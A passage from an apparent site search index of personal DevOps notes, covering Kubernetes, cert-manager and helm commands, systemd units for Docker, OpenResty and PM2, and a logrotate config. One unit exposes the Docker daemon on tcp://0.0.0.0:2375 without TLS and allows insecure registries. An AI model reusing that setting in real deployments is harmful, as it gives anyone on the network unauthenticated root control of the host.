30 account=$(kubectl -n \u0026#34;${nameSpace}\u0026#34; get secret kube-prometheus-stack-grafana -o jsonpath=\u0026#34;{.data.admin-user}\u0026#34; | base64 -d) password=$(kubectl -n \u0026#34;${nameSpace}\u0026#34; get secret kube-prometheus-stack-grafana -o jsonpath=\u0026#34;{.data.admin-password}\u0026#34; | base64 -d) Create and use secret command kubectl -n nginx create secret docker-registry gitlab --docker-server=registry.go2cloudten.com --docker-username=ricky --docker-password=\u0026#34;token or password\u0026#34; config imagePullSecrets: - name: gitlab Run pod kubectl run -it --rm --image=registry.go2cloudten.com/it/docker/backup test --image-pull-policy=IfNotPresent -- bash ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/k8s/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ecert-manager\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://cert-manager.io/docs\" target=\"_blank\" rel=\"noopener\"\u003ecert-manager\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/k8s/files/cert-manager/cert-manager-aws-iam-role.json\"\u003eRoute53 IAM Role\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/k8s/files/cert-manager/cert-manager-resource.yaml\"\u003eCert Manager Resource\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/k8s/files/cert-manager/cert-generate-resource.yaml\"\u003eCert Generate Resource\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/bash/k8s/files/cert-manager/cert-ingress-resource.yaml\"\u003eCert Ingress Resource\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install the cert-manager CustomResourceDefinition resources\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.1/cert-manager.crds.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Add the Jetstack Helm repository\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm repo add jetstack https://charts.jetstack.io\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm repo update\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install the cert-manager helm chart\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm install \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  cert-manager jetstack/cert-manager \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --namespace cert-manager \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --create-namespace \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --version v1.13.1 \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --set installCRDs\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  --set prometheus.enabled\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003efalse \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e  --set webhook.timeoutSeconds\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# uninstalling\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm delete my-release\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl delete -f https://github.com/cert-manager/cert-manager/releases/download/v1.13.1/cert-manager.crds.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create clusterissuer\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f cert-manager-resource.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# generate certificate\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f cert-generate-resource.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create ingress controller\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.8.2/deploy/static/provider/cloud/deploy.yaml\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create ingress\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekubectl apply -f cert-ingress-resource.yaml\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ehelm\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# install plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm plugin install https://github.com/chartmuseum/helm-push.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# add repo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## helm repo add --username gitlab-ci-token --password ${CI_JOB_TOKEN} ${CI_PROJECT_NAME} ${CI_API_V4_URL}/projects/${CI_PROJECT_ID}/packages/helm/stable\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm repo add go2helm https://gitlab.go2cloudten.com/api/v4/projects/29/packages/helm/stable --username ricky\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# push chart\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## https://docs.gitlab.com/ee/user/packages/helm_repository/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehelm cm-push ./proxy-0.1.0.tgz go2helm\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ekompose\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekompose --file docker-compose.yml convert\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egitlab-runner\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cp\u003e\u003ca href=\"https://docs.gitlab.com/ee/user/project/clusters/add_remove_clusters.html\" target=\"_blank\" rel=\"noopener\"\u003elink\u003c/a\u003e\u003c/p\u003e","tags":null,"title":"K8s Command"},{"categories":null,"contents":" docker.service ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock --bip 10.255.0.1/16 --containerd=/run/containerd/containerd.sock --insecure-registry hub.srjob.co:8888 --insecure-registry registry.knowhow.fun gd.service [Unit] Description=Fetch DNS After=network.target After=mysql.service [Service] WorkingDirectory=/data/dns ExecStart=/data/dns/gd -o hourly ExecReload=/bin/kill -s HUP $MAINPID Restart=always [Install] WantedBy=multi-user.target openresty.service [Unit] Description=The OpenResty Application Platform After=syslog.target network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking WorkingDirectory=/data/config/nginx PIDFile=/data/config/nginx/logs/nginx.pid ExecStartPre=/usr/bin/chown -R root:root /data/nginx ExecStartPre=/usr/bin/rm -f /data/nginx/logs/nginx.pid ExecStartPre=/usr/local/openresty/nginx/sbin/nginx -p /data/nginx -t ExecStart=/usr/local/openresty/nginx/sbin/nginx -p /data/nginx ExecReload=/bin/kill -s HUP $MAINPID ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /data/nginx/logs/nginx.pid #ExecStop=/bin/kill -s QUIT $MAINPID KillSignal=SIGQUIT TimeoutStopSec=5 KillMode=process PrivateTmp=true LimitNOFILE=1048576 [Install] WantedBy=multi-user.target pm2.service [Unit] Description=PM2 process manager Documentation=https://pm2.keymetrics.io/ After=network.target [Service] Type=forking User=root LimitNOFILE=infinity LimitNPROC=infinity LimitCORE=infinity Environment=PM2_HOME=/root/.pm2 PIDFile=/root/.pm2/pm2.pid WorkingDirectory=/game/publish ExecStart=/lib/node_modules/pm2/bin/pm2 start game_api.json manage.json ExecReload=/lib/node_modules/pm2/bin/pm2 reload all ExecStop=/lib/node_modules/pm2/bin/pm2 kill [Install] WantedBy=multi-user.target logrotate /data/gameapi/logs/*.log { create 0644 nobody root daily rotate 30 dateext missingok notifempty compress sharedscripts postrotate /bin/kill -USR1 `cat /data/gameapi/logs/nginx.pid 2\u0026gt;/dev/null` 2\u0026gt;/dev/null || true endscript } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/linux/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003edocker.service\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock --bip 10.255.0.1/16 --containerd\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/run/containerd/containerd.sock --insecure-registry hub.srjob.co:8888 --insecure-registry registry.knowhow.fun\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egd.service\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFetch DNS\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emysql.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWorkingDirectory\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/data/dns\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/data/dns/gd -o hourly\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecReload\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/bin/kill -s HUP $MAINPID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRestart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ealways\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eopenresty.service\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eThe OpenResty Application Platform\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esyslog.target network-online.target remote-fs.target nss-lookup.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWants\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enetwork-online.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eType\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eforking\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWorkingDirectory\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/data/config/nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePIDFile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/data/config/nginx/logs/nginx.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStartPre\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/bin/chown -R root:root /data/nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStartPre\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/bin/rm -f /data/nginx/logs/nginx.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStartPre\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/local/openresty/nginx/sbin/nginx -p /data/nginx -t\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/local/openresty/nginx/sbin/nginx -p /data/nginx\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecReload\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/bin/kill -s HUP $MAINPID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStop\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /data/nginx/logs/nginx.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#ExecStop=/bin/kill -s QUIT $MAINPID\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eKillSignal\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eSIGQUIT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTimeoutStopSec\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eKillMode\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eprocess\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePrivateTmp\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003etrue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLimitNOFILE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1048576\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003epm2.service\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ePM2 process manager\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDocumentation\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ehttps://pm2.keymetrics.io/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enetwork.target\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eType\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eforking\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUser\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eroot\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLimitNOFILE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einfinity\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLimitNPROC\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einfinity\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLimitCORE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003einfinity\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnvironment\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ePM2_HOME\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/root/.pm2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePIDFile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/root/.pm2/pm2.pid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWorkingDirectory\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/game/publish\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/lib/node_modules/pm2/bin/pm2 start game_api.json manage.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecReload\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/lib/node_modules/pm2/bin/pm2 reload all\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStop\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/lib/node_modules/pm2/bin/pm2 kill\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003elogrotate\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/data/gameapi/logs/*.log {\n    create 0644 nobody root\n    daily\n    rotate 30\n    dateext\n    missingok\n    notifempty\n    compress\n    sharedscripts\n    postrotate\n    /bin/kill -USR1 `cat /data/gameapi/logs/nginx.pid 2\u0026gt;/dev/null` 2\u0026gt;/dev/null || true\n    